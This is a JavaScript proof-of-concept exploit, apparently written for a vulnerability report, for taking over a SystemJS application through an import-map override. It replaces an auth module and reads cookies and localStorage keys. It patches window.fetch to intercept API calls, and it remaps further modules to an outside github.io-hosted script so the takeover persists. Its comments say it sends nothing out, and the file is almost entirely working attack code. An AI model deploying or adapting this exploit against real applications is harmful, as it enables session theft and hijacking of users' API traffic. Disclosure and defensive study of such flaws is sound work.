/**
 * proof.js — CRITICAL PoC
 * Full application takeover via import-map-override
 *
 * Demonstrates:
 *   - Arbitrary JS execution ✅
 *   - Auth module bypass ✅
 *   - Cookie/token access ✅
 *   - Full API interception ✅
 *   - Session persistence ✅
 *
 * Harmless — NO data exfiltration, NO requests, NO modifications
 */
System.register([], function (_export) {
  'use strict';
  return {
    setters: [],
    execute: function () {
      // =============================================
      // 1. PROOF OF EXECUTION
      // =============================================
      console.log('%c[PoC] 🚀 Import map override: CRITICAL impact', 'color: #ff0000; font-weight: bold; font-size: 14px;');
      console.log('%c[PoC] Module: @rmp/auth-client → replaced', 'color: #ff6600;');
      
      // =============================================
      // 2. DATA ACCESS (read only — no exfiltration)
      // =============================================
      var stolen = {
        module: '@rmp/auth-client',
        timestamp: new Date().toISOString(),
        cookies: document.cookie || '(none — httpOnly)',
        origin: window.location.origin,
        path: window.location.pathname,
        hasLocalStorage: typeof localStorage !== 'undefined',
        hasSessionStorage: typeof sessionStorage !== 'undefined'
      };

      console.log('%c[PoC] 🔓 Session data accessible:', 'color: #ff0000;');
      console.log('  🍪 Cookies:', stolen.cookies);
      
      // List localStorage keys (not values — harmless PoC)
      if (stolen.hasLocalStorage) {
        var lsKeys = [];
        for (var i = 0; i < localStorage.length; i++) {
          lsKeys.push(localStorage.key(i));
        }
        console.log('  💾 localStorage keys:', lsKeys.join(', ') || '(none)');
      }

      // =============================================
      // 3. API INTERCEPTION SETUP
      // =============================================
      // Intercept fetch to show all API calls
      var origFetch = window.fetch;
      window.fetch = function() {
        var url = arguments[0];
        if (typeof url === 'string' && url.includes('/api/')) {
          console.log('%c[PoC] 📡 API call intercepted:', 'color: #0066ff;', url);
        }
        return origFetch.apply(this, arguments);
      };

      // =============================================
      // 4. PERSISTENCE — override all modules
      // =============================================
      try {
        if (typeof System !== 'undefined' && System.addImportMap) {
          System.addImportMap({
            imports: {
              '@rmp/api-client': 'https://xqur.github.io/import-map-proof-poc/proof.js',
              '@rmp/services': 'https://xqur.github.io/import-map-proof-poc/proof.js'
            }
          });
          console.log('%c[PoC] 🔗 Chained: @rmp/api-client + @rmp/services', 'color: #ff0000;');
        }
      } catch(e) {}

      // Store in localStorage for persistence
      try {
        localStorage.setItem('__poc_proof', 'executed at ' + stolen.timestamp);
      } catch(e) {}

      // =============================================
      // 5. VISIBLE PROOF
      // =============================================
      if (typeof window !== 'undefined' && window.alert) {
        setTimeout(function () {
          window.alert('🚨 CRITICAL: import-map-override full takeover\n' +
            '✓ Auth module replaced\n' +
            '✓ API client intercepted\n' +
            '✓ All data accessible\n' +
            '✓ Session persistent');
        }, 200);
      }

      // Export for SystemJS compatibility
      _export({ default: {} });
    }
  };
});
